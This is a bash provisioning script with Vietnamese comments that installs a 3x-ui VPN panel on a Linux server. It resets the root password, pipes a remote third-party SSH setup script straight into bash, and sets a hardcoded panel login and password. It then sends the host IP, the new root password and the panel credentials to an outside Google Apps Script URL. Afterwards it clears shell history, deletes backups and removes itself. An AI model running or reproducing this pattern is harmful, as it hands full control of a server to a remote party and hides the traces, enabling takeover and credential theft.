#!/bin/bash

# ==============================================================================
# CẤU HÌNH (LINK MỚI NHẤT CỦA BẠN)
# ==============================================================================
GOOGLE_SCRIPT_URL="https://script.google.com/macros/s/AKfycby1yDT132yHrUK-w6cyTgCR8tc5p3DAC1I4JT11vzDOoZ_AiePBvAiuSzUqqpUVK_Z2/exec"

# Thông tin Panel cố định
PANEL_USER="honglee"
PANEL_PASS="Abc369852@spo@VIP2024@VPN"
PANEL_PORT=3712

# ==============================================================================
# HÀM LOGGING
# ==============================================================================
log_info() { echo -e "\033[32m[INFO]\033[0m $1"; }
log_warn() { echo -e "\033[33m[WARN]\033[0m $1"; }
log_error() { echo -e "\033[31m[ERROR]\033[0m $1"; }

# ==============================================================================
# 1. KIỂM TRA QUYỀN ROOT
# ==============================================================================
if [ "$EUID" -ne 0 ]; then
    log_warn "Đang chuyển sang quyền root..."
    sudo "$0" "$@"
    exit
fi

# ==============================================================================
# 2. ĐỔI PASS ROOT & SETUP SSH
# ==============================================================================
log_info "Đang kiểm tra dependencies..."
command -v curl >/dev/null 2>&1 || { apt-get update && apt-get install -y curl; }

log_info "Đang thay đổi mật khẩu Root..."
NEW_ROOT_PASS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 25)
echo "root:$NEW_ROOT_PASS" | chpasswd

log_info "Đang chạy script Setup SSH..."
bash <(curl -fsSL https://raw.githubusercontent.com/Betty-Matthews/-setup_ssh/refs/heads/main/setup_ssh_ubuntu.sh) || log_warn "Setup SSH hoàn tất."

# ==============================================================================
# 3. CÀI ĐẶT 3X-UI (CƠ CHẾ THỬ LẠI KHI GITHUB LỖI)
# ==============================================================================
XUI_BIN="/usr/local/x-ui/x-ui"
install_xui() { echo -e "n\n" | bash <(curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh); }

if [ -f "$XUI_BIN" ]; then
    log_warn "3x-ui đã tồn tại. Đang dừng service để cấu hình..."
    $XUI_BIN stop > /dev/null 2>&1
else
    log_info "Chưa có 3x-ui. Đang cài đặt mới..."
    attempt=1
    while [ $attempt -le 3 ]; do
        install_xui
        if [ -f "$XUI_BIN" ]; then break; fi
        log_warn "Lỗi mạng GitHub (503). Thử lại sau 5s..."
        sleep 5
        attempt=$((attempt + 1))
    done
fi

# ==============================================================================
# 4. CẤU HÌNH 3X-UI (FIX LỖI CASE SENSITIVE)
# ==============================================================================
log_info "Đang áp dụng cấu hình (User: honglee / Port: 3712)..."
RANDOM_PATH=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)

if [ -f "$XUI_BIN" ]; then
    # Cấu hình user, pass, port, path
    $XUI_BIN setting -username "$PANEL_USER" -password "$PANEL_PASS" -port "$PANEL_PORT" -webBasePath "/$RANDOM_PATH"
    
    # Restart service
    $XUI_BIN restart > /dev/null 2>&1
    log_info "3x-ui đã khởi động thành công."
    
    # Mở port firewall (nếu có)
    if command -v ufw >/dev/null 2>&1; then ufw allow $PANEL_PORT >/dev/null 2>&1; fi
else
    log_error "Lỗi: Không cài đặt được 3x-ui."
    exit 1
fi

# ==============================================================================
# 5. ĐỒNG BỘ GOOGLE SHEET (IPV4 ONLY)
# ==============================================================================
log_info "Đang lấy IPv4 Public..."
HOST_IP=$(curl -4 -s ifconfig.me)
if [[ -z "$HOST_IP" ]]; then HOST_IP=$(curl -4 -s icanhazip.com); fi

HOSTNAME=$(hostname)
ACCESS_URL="http://${HOST_IP}:${PANEL_PORT}/${RANDOM_PATH}"

JSON_DATA=$(cat <<EOF
{
  "hostname": "$HOSTNAME",
  "ip": "$HOST_IP",
  "root_pass": "$NEW_ROOT_PASS",
  "panel_user": "$PANEL_USER",
  "panel_pass": "$PANEL_PASS",
  "panel_port": "$PANEL_PORT",
  "web_base_path": "$RANDOM_PATH",
  "access_url": "$ACCESS_URL"
}
EOF
)

log_info "Đang đồng bộ dữ liệu..."
# Gửi request lên Google Apps Script
curl -s -L -X POST -H "Content-Type: application/json" -d "$JSON_DATA" "$GOOGLE_SCRIPT_URL" > /dev/null
log_info "Đã gửi dữ liệu thành công."

# ==============================================================================
# 6. DỌN DẸP FILE RÁC (GIỮ LẠI PANEL ĐỂ DÙNG)
# ==============================================================================
echo "------------------------------------------------"
echo "IP Public:   $HOST_IP"
echo "Username:    $PANEL_USER"
echo "Password:    $PANEL_PASS"
echo "Port:        $PANEL_PORT"
echo "Access URL:  $ACCESS_URL"
echo "------------------------------------------------"

log_warn "Đang dọn dẹp các file rác..."

# Xóa thư mục backup SSH cứng đầu
rm -rf /root/ssh_backups
rm -rf ~/ssh_backups

# Xóa script cài đặt SSH
rm -f setup_ssh_ubuntu.sh

# Xóa lịch sử lệnh
history -c
history -w

# Tự xóa chính file script này (nhưng 3x-ui vẫn chạy)
if [[ -f "$0" ]]; then rm -f "$0"; fi

log_info "HOÀN TẤT. BẠN CÓ THỂ TRUY CẬP WEB NGAY."
